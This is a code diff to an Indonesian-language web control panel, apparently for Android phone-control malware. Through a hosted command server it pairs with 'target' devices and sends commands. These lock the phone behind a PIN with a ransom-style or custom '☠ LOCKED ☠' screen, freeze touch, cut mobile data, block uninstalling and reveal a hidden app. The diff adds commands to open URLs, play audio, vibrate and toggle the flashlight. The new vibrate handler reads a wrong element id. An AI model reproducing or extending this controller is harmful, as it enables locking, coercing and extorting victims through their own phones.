@@ -14,7 +14,6 @@
     padding-bottom: 40px;
   }
 
-  /* HEADER */
   .header {
     text-align: center;
     margin-bottom: 20px;
@@ -33,7 +32,6 @@
   }
   .header p { font-size: 11px; color:#888; margin-top:4px; letter-spacing:1px; }
 
-  /* PAIRING */
   .card {
     background: #111;
     border: 1px solid #333;
@@ -65,7 +63,6 @@
     text-shadow: 0 0 8px #00ffcc88;
   }
 
-  /* BUTTON */
   .btn {
     background: linear-gradient(135deg, #cc0000, #660000);
     border: none;
@@ -83,8 +80,8 @@
   .btn:active { transform: scale(0.97); }
   .btn.green { background: linear-gradient(135deg, #008844, #00cc66); }
   .btn.dark { background: linear-gradient(135deg, #222, #111); border:1px solid #444; }
+  .btn.full { width:100%; }
 
-  /* DEVICE ITEM */
   .device-list { display: flex; flex-direction: column; gap: 10px; }
   .device-item {
     background: linear-gradient(135deg, #1a0000, #0a0a0a);
@@ -104,12 +101,19 @@
   .status-on { color: #00ff88; }
   .status-on::before { content: "● "; }
 
-  /* GRID MENU CONTROL */
+  .section-title {
+    font-size: 12px;
+    color: #ff3333;
+    letter-spacing: 2px;
+    margin: 20px 0 10px;
+    padding-left: 5px;
+    border-left: 3px solid #cc0000;
+  }
+
   .control-grid {
     display: grid;
     grid-template-columns: repeat(3, 1fr);
     gap: 10px;
-    margin-top: 10px;
   }
   @media (max-width: 400px) {
     .control-grid { grid-template-columns: repeat(2, 1fr); }
@@ -124,7 +128,6 @@
     cursor: pointer;
     transition: all 0.25s;
     position: relative;
-    overflow: hidden;
   }
   .control-card:hover {
     border-color: #cc0000;
@@ -172,7 +175,6 @@
     box-shadow: 0 0 8px #ff0000;
   }
 
-  /* MODAL */
   .modal {
     display: none;
     position: fixed;
@@ -198,7 +200,6 @@
     overflow-y: auto;
     box-shadow: 0 0 40px #cc000066;
   }
-
   .modal-content h3 {
     color: #ff3333;
     font-size: 16px;
@@ -207,7 +208,6 @@
     border-bottom: 1px solid #333;
     padding-bottom: 10px;
   }
-
   label {
     font-size: 11px;
     color: #ff6666;
@@ -216,7 +216,6 @@
     letter-spacing: 1px;
     text-transform: uppercase;
   }
-
   input[type=text], input[type=number], textarea, select {
     width: 100%;
     background: #000;
@@ -226,24 +225,16 @@
     color: #fff;
     font-size: 13px;
     font-family: 'Courier New', monospace;
-    resize: vertical;
   }
   input:focus, textarea:focus, select:focus {
     outline: none;
     border-color: #cc0000;
     box-shadow: 0 0 10px #cc000066;
   }
-
-  textarea { min-height: 100px; }
-
-  .modal-actions {
-    display: flex;
-    gap: 8px;
-    margin-top: 18px;
-  }
+  textarea { min-height: 100px; resize: vertical; }
+  .modal-actions { display: flex; gap: 8px; margin-top: 18px; }
   .modal-actions .btn { flex: 1; }
 
-  /* TOAST */
   .toast {
     position: fixed;
     bottom: 25px;
@@ -273,7 +264,6 @@
   <p>CYBERPUNK EDITION · MADE BY ZAMZZZ</p>
 </div>
 
-<!-- PAIRING -->
 <div class="card">
   <h2>🔑 Code Pairing</h2>
   <div class="pairing-box">
@@ -283,77 +273,67 @@
   </div>
 </div>
 
-<!-- DEVICE LIST -->
 <div class="card">
   <h2>📱 List Device <span id="deviceCount" style="color:#00ff88; font-size:11px;">(0)</span></h2>
   <div class="device-list" id="deviceList">
-    <p style="text-align:center; color:#666; font-size:11px; padding:15px;">
-      Belum ada perangkat terhubung.
-    </p>
+    <p style="text-align:center; color:#666; font-size:11px; padding:15px;">Belum ada perangkat terhubung.</p>
   </div>
 </div>
 
-<!-- CONTROL MENU (muncul kalau device dipilih) -->
+<!-- CONTROL PANEL -->
 <div class="card" id="controlPanel" style="display:none;">
   <h2 id="controlTitle">🎯 Control Device</h2>
-  <div class="control-grid" id="controlGrid">
-    <!-- 9 FITUR -->
+
+  <div class="section-title">⚡ KONTROL UTAMA</div>
+  <div class="control-grid">
     <div class="control-card" onclick="openModal('reconnect')">
       <div class="dot-online"></div>
       <div class="control-icon">↻</div>
       <div class="control-title">Connect Ulang</div>
       <div class="control-desc">Reconnect Target</div>
     </div>
-
     <div class="control-card" onclick="openModal('lock')">
       <div class="dot-online"></div>
       <div class="control-icon">🔒</div>
       <div class="control-title">Lock HP</div>
       <div class="control-desc">HTML Cyberpunk Lock</div>
     </div>
-
     <div class="control-card" onclick="sendCommand('unlock')">
       <div class="dot-online"></div>
       <div class="control-icon">🔓</div>
       <div class="control-title">Unlock HP</div>
       <div class="control-desc">Buka Kunci</div>
     </div>
-
     <div class="control-card" onclick="openModal('lockhtml')">
       <div class="dot-online"></div>
       <div class="control-icon">📝</div>
       <div class="control-title">Lock Custom HTML</div>
       <div class="control-desc">Template HTML Lock</div>
     </div>
-
     <div class="control-card" onclick="openModal('text')">
       <div class="dot-online"></div>
       <div class="control-icon">💬</div>
       <div class="control-title">Kirim Teks Layar</div>
       <div class="control-desc">Tulis Pesan</div>
     </div>
-
     <div class="control-card" onclick="sendCommand('antiuninstall')">
       <div class="dot-online"></div>
       <div class="control-icon">🛡</div>
       <div class="control-title">Anti Uninstall</div>
       <div class="control-desc">Lindungi Aplikasi</div>
     </div>
-
     <div class="control-card" onclick="sendCommand('blocktouch')">
       <div class="dot-online"></div>
       <div class="control-icon">✋</div>
       <div class="control-title">Block Touch</div>
       <div class="control-desc">Bekukan Layar Target</div>
     </div>
-
     <div class="control-card" onclick="sendCommand('unlocktouch')">
       <div class="dot-online"></div>
       <div class="control-icon">🖐</div>
       <div class="control-title">Unlock Touch</div>
       <div class="control-desc">Bebaskan Layar</div>
     </div>
-
     <div class="control-card" onclick="sendCommand('killdata')">
       <div class="dot-online"></div>
       <div class="control-icon">📵</div>
@@ -361,21 +341,58 @@
       <div class="control-desc">Matikan Data Target</div>
     </div>
   </div>
+
+  <div class="section-title">🔥 FITUR TAMBAHAN</div>
+  <div class="control-grid">
+    <div class="control-card" onclick="sendCommand('flashon')">
+      <div class="dot-online"></div>
+      <div class="control-icon">⚡</div>
+      <div class="control-title">Nyatakan Flash</div>
+      <div class="control-desc">Nyalakan Lampu Senter</div>
+    </div>
+    <div class="control-card" onclick="sendCommand('flashoff')">
+      <div class="dot-online"></div>
+      <div class="control-icon">⚡</div>
+      <div class="control-title">Matikan Flash</div>
+      <div class="control-desc">Matikan Lampu Senter</div>
+    </div>
+    <div class="control-card" onclick="openModal('website')">
+      <div class="dot-online"></div>
+      <div class="control-icon">🌐</div>
+      <div class="control-title">Buka Website</div>
+      <div class="control-desc">Ketik URL Website</div>
+    </div>
+    <div class="control-card" onclick="sendCommand('showicon')">
+      <div class="dot-online"></div>
+      <div class="control-icon">👁</div>
+      <div class="control-title">Show Icon</div>
+      <div class="control-desc">Munculkan Aplikasi Target</div>
+    </div>
+    <div class="control-card" onclick="openModal('music')">
+      <div class="dot-online"></div>
+      <div class="control-icon">🎵</div>
+      <div class="control-title">Putar Musik</div>
+      <div class="control-desc">Ketik URL MP3</div>
+    </div>
+    <div class="control-card" onclick="openModal('vibrate')">
+      <div class="dot-online"></div>
+      <div class="control-icon">📳</div>
+      <div class="control-title">Getar</div>
+      <div class="control-desc">Durasi (ms)</div>
+    </div>
+  </div>
 </div>
 
-<!-- MODAL -->
 <div class="modal" id="modal">
   <div class="modal-content" id="modalContent"></div>
 </div>
 
-<!-- TOAST -->
 <div class="toast" id="toast">Berhasil!</div>
 
 <script>
 /* ==================== CONFIG ==================== */
 const API_BASE = "https://lyx-server-production-a926.up.railway.app";
 
-/* ==================== STATE ==================== */
 let devices = JSON.parse(localStorage.getItem('lyx_devices') || '[]');
 let currentDeviceId = null;
 
@@ -387,7 +404,7 @@ function showToast(msg, success=false) {
   setTimeout(() => t.className = 'toast', 2500);
 }
 
-/* ==================== PAIRING CODE ==================== */
+/* ==================== PAIRING ==================== */
 function generateCode() {
   const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
   let code = '';
@@ -399,7 +416,6 @@ function generateCode() {
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ code })
   }).catch(() => {});
-
   showToast('Code dibuat: ' + code, true);
 }
 
@@ -411,7 +427,7 @@ function copyCode() {
   showToast('Code dicopy!', true);
 }
 
-/* ==================== RENDER DEVICES ==================== */
+/* ==================== RENDER ==================== */
 function renderDevices() {
   const list = document.getElementById('deviceList');
   const count = document.getElementById('deviceCount');
@@ -440,7 +456,6 @@ function esc(s) {
   return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
 }
 
-/* ==================== POLL DEVICES ==================== */
 function pollDevices() {
   fetch(API_BASE + '/api/devices')
     .then(r => r.json())
@@ -453,7 +468,6 @@ function pollDevices() {
     }).catch(() => {});
 }
 
-/* ==================== SELECT DEVICE ==================== */
 function selectDevice(id) {
   currentDeviceId = id;
   const d = devices.find(x => x.id === id);
@@ -468,12 +482,10 @@ function selectDevice(id) {
 function sendCommand(type, extra = {}) {
   if (!currentDeviceId) { showToast('Pilih device dulu!'); return; }
 
-  const payload = { deviceId: currentDeviceId, type, ...extra };
-
   fetch(API_BASE + '/api/command', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
+    body: JSON.stringify({ deviceId: currentDeviceId, type, ...extra })
   })
   .then(r => r.json())
   .then(res => {
@@ -497,45 +509,66 @@ function openModal(type) {
       <label>PIN Unlock (4-6 digit)</label>
       <input type="number" id="lockPin" placeholder="1234" maxlength="6">
       <label>Pesan untuk Target</label>
-      <textarea id="lockMsg" placeholder="HP ini terkunci. Hubungi admin.">HP ini terkunci. Hubungi admin.</textarea>
+      <textarea id="lockMsg">HP ini terkunci. Hubungi admin.</textarea>
       <div class="modal-actions">
         <button class="btn dark" onclick="closeModal()">Batal</button>
-        <button class="btn" onclick="submitLock()">🔒 Kunci Sekarang</button>
-      </div>
-    `;
+        <button class="btn" onclick="submitLock()">🔒 Kunci</button>
+      </div>`;
   } else if (type === 'lockhtml') {
     html = `
       <h3>📝 Lock Custom HTML</h3>
       <label>PIN Unlock (4-6 digit)</label>
       <input type="number" id="lockPin" placeholder="1234" maxlength="6">
       <label>Custom HTML</label>
-      <textarea id="lockHtml" placeholder="<h1>LOCKED</h1>" style="min-height:150px;"><h1 style="color:red;text-align:center;padding-top:100px;font-size:60px;">☠ LOCKED ☠</h1></textarea>
+      <textarea id="lockHtml" style="min-height:150px;"><h1 style="color:red;text-align:center;padding-top:100px;font-size:60px;">☠ LOCKED ☠</h1></textarea>
       <div class="modal-actions">
         <button class="btn dark" onclick="closeModal()">Batal</button>
-        <button class="btn" onclick="submitLockHtml()">📝 Kirim Lock</button>
-      </div>
-    `;
+        <button class="btn" onclick="submitLockHtml()">📝 Kirim</button>
+      </div>`;
   } else if (type === 'text') {
     html = `
       <h3>💬 Kirim Teks Layar</h3>
-      <label>Teks yang muncul di layar target</label>
-      <textarea id="screenText" placeholder="Tulis pesan..." style="min-height:120px;">Halo, ini pesan dari admin.</textarea>
+      <label>Teks untuk target</label>
+      <textarea id="screenText" style="min-height:120px;">Halo, ini pesan dari admin.</textarea>
       <div class="modal-actions">
         <button class="btn dark" onclick="closeModal()">Batal</button>
-        <button class="btn" onclick="submitText()">💬 Kirim Teks</button>
-      </div>
-    `;
+        <button class="btn" onclick="submitText()">💬 Kirim</button>
+      </div>`;
   } else if (type === 'reconnect') {
     html = `
       <h3>↻ Connect Ulang</h3>
-      <p style="color:#aaa; font-size:12px; line-height:1.6;">
-        Kirim sinyal ke perangkat target untuk menyambung ulang ke server.
-      </p>
+      <p style="color:#aaa; font-size:12px; line-height:1.6;">Kirim sinyal reconnect ke perangkat target.</p>
       <div class="modal-actions">
         <button class="btn dark" onclick="closeModal()">Batal</button>
         <button class="btn green" onclick="submitReconnect()">↻ Reconnect</button>
-      </div>
-    `;
+      </div>`;
+  } else if (type === 'website') {
+    html = `
+      <h3>🌐 Buka Website</h3>
+      <label>URL Website</label>
+      <input type="text" id="urlInput" placeholder="https://google.com" value="https://">
+      <div class="modal-actions">
+        <button class="btn dark" onclick="closeModal()">Batal</button>
+        <button class="btn" onclick="submitWebsite()">🌐 Buka</button>
+      </div>`;
+  } else if (type === 'music') {
+    html = `
+      <h3>🎵 Putar Musik</h3>
+      <label>URL MP3</label>
+      <input type="text" id="musicUrl" placeholder="https://example.com/song.mp3">
+      <div class="modal-actions">
+        <button class="btn dark" onclick="closeModal()">Batal</button>
+        <button class="btn" onclick="submitMusic()">🎵 Putar</button>
+      </div>`;
+  } else if (type === 'vibrate') {
+    html = `
+      <h3>📳 Getar</h3>
+      <label>Durasi (milidetik)</label>
+      <input type="number" id="vibDur" placeholder="1000" value="1000">
+      <div class="modal-actions">
+        <button class="btn dark" onclick="closeModal()">Batal</button>
+        <button class="btn" onclick="submitVibrate()">📳 Getar</button>
+      </div>`;
   }
 
   content.innerHTML = html;
@@ -546,12 +579,11 @@ function closeModal() {
   document.getElementById('modal').classList.remove('show');
 }
 
-/* ==================== SUBMIT HANDLERS ==================== */
+/* ==================== SUBMIT ==================== */
 function submitLock() {
   const pin = document.getElementById('lockPin').value;
   const msg = document.getElementById('lockMsg').value;
   if (!pin) { showToast('Isi PIN dulu!'); return; }
-
   sendCommand('lock', { pin, message: msg });
   closeModal();
 }
@@ -560,16 +592,13 @@ function submitLockHtml() {
   const pin = document.getElementById('lockPin').value;
   const html = document.getElementById('lockHtml').value;
   if (!pin) { showToast('Isi PIN dulu!'); return; }
-  if (!html) { showToast('Isi HTML dulu!'); return; }
-
   sendCommand('lockhtml', { pin, html });
   closeModal();
 }
 
 function submitText() {
   const text = document.getElementById('screenText').value;
-  if (!text) { showToast('Isi teks dulu!'); return; }
-
+  if (!text) { showToast('Isi teks!'); return; }
   sendCommand('text', { message: text });
   closeModal();
 }
@@ -579,11 +608,31 @@ function submitReconnect() {
   closeModal();
 }
 
+function submitWebsite() {
+  const url = document.getElementById('urlInput').value;
+  if (!url) { showToast('Isi URL!'); return; }
+  sendCommand('website', { url });
+  closeModal();
+}
+
+function submitMusic() {
+  const url = document.getElementById('musicUrl').value;
+  if (!url) { showToast('Isi URL MP3!'); return; }
+  sendCommand('music', { url });
+  closeModal();
+}
+
+function submitVibrate() {
+  const dur = document.getElementById('vibrate').value;
+  if (!dur) { showToast('Isi durasi!'); return; }
+  sendCommand('vibrate', { duration: parseInt(dur) });
+  closeModal();
+}
+
 /* ==================== INIT ==================== */
 renderDevices();
 setInterval(pollDevices, 4000);
 
-/* Close modal on background click */
 document.getElementById('modal').addEventListener('click', function(e) {
   if (e.target === this) closeModal();
 });
